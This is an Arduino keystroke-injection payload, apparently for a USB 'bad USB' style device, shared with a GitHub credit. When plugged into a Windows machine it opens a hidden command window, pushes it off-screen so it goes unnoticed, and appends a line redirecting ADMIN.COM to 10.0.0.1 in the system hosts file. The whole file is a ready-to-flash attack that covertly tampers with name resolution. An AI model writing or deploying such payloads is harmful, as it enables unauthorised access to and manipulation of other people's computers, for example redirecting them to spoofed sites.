//Edited: @hidesec (GITHUB)

#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  Keyboard.print("cmd /Q /D /T:7F /F:OFF /V:ON /K");

  delay(500);

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  Keyboard.print("M");

  for(int i = 0; i < 100; i++) {
    typeKey(KEY_DOWN_ARROW);
  }

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("ECHO. >> C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("ECHO 10.0.0.1 ADMIN.COM >> C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS");

  delay(50);

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}